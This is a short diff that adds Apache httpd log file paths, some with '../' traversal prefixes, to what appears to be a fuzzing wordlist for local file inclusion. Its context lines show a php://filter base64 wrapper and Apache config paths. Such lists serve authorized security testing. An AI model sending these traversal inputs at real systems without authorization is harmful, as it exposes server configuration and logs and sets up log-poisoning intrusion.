@@ -45,3 +45,12 @@ php://filter/convert.base64-encode/resource=config
 /etc/apache2/.htaccess
 /etc/apache2/httpd.conf
 /api/users
+/var/log/httpd/
+/var/log/httpd-access.log
+/var/log/httpd-error.log
+/var/log/httpd/access_log
+/var/log/httpd/access.log
+../../../../../var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/httpd/error.log
+../../../../../var/log/httpd/error_log
